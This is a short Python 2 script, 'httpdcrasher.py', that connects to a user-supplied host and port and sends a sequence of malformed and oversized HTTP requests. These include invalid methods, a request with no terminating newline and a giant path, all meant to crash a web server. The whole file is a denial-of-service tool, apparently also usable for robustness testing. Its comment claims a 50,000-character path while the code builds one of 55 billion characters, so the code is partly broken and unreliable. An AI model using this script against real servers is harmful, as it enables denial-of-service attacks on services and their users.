#!/usr/bin/python
import socket, sys

def sendrequest(req, getreply):
  # Create a socket
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  # Connect to the remote host and port
  sock.connect((sys.argv[1], int(sys.argv[2])))
  
  dispReq = req
  if len(dispReq) > 50:
    dispReq = dispReq[:50];

  dispReq = dispReq.replace("\n", "\\n")
  print "Sending " + dispReq + " ..."
  # Send a request to the host
  sock.send(req)
  
  if (getreply):
    # Get the host's response, no more than, say, 1,024 bytes
    response_data = sock.recv(1024)
    firstline = response_data.split("\n")
    print "Got " + firstline[0]
    
  # Terminate
  sock.close(  )



if len(sys.argv) != 3:
  print "Usage: httpdcrasher.py hostname port\n"
  sys.exit(0)
  
sendrequest("GET / HTTP/1.0\n\n", 1); # this request is valid but refers to a directory file, which may cause problems
sendrequest("MUSH\n\n", 1); # invalid request
sendrequest("MUSH /stuff HTTP/1.0\n\n", 1); # invalid request
sendrequest("GET /" + ('X' * 55000000000) + " HTTP/1.0\n\n", 1); # a valid path with 50,000 X's
sendrequest("GET / HTTP/1.0", 0); # invalid request (no newline)
